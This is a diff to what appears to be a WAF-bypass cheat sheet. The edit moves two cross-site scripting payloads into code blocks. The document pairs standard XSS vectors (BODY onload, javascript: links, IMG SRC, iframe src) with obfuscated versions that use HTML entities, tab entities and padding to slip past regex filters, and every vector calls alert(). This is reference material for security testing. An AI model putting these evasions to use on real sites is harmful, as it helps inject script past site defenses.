@@ -1677,7 +1677,10 @@ __Standard__: `<BODY onload=alert()>`
 __Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
 
 __Standard__: `<a href=javascript;alert()>ClickMe `  
-__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
+__Bypassed__: 
+```
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+```
 
 __10. Line Breaks__
 - Many WAF with regex based filtering effectively blocks many attempts.
@@ -1703,7 +1706,10 @@ __Bypassed__: `<IMG SRC="    javascript:alert();">`
 __Variant__: `<IMG SRC="    jav    ascript:alert    ();">`
 
 __Standard__: `<iframe src=javascript:alert(1)></iframe>`  
-__Obfuscated__: `<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>`
+__Obfuscated__: 
+```
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+```
 
 ### Browser Bugs:
 #### Charset Bugs:
